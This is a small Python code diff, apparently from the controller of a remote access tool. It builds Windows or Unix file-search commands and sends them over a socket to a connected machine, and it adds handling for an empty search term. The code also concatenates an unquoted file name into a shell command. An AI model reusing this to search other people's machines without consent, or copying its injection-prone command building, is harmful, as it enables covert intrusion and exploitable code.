@@ -97,7 +97,10 @@ def searchFile(connectionSocket, fileName):
         cmd = "dir \"" + fileName + "\" /a /s"
         print(cmd)
     else:
-        cmd = "find -name " + fileName
+        if fileName != "":
+            cmd = "find -name " + fileName
+        else:
+            cmd = "find"
     connectionSocket.send(cmd.encode())  # 143
     print("Ricerca...")
     global stop_threads
@@ -210,9 +213,12 @@ def main():
                     LogOnFile("infoOs.txt", d)
 
                 elif "search" in cmd:
-                    cmd = cmd + " "
-                    toSearch = cmd.replace("search ", "")
-                    output = searchFile(connectionSocket, toSearch)
+                    if cmd == "search":
+                        output = searchFile(connectionSocket, "")
+                    else:
+                        cmd = cmd + " "
+                        toSearch = cmd.replace("search ", "")
+                        output = searchFile(connectionSocket, toSearch)
 
                 elif cmd == "help":
                     print(help)
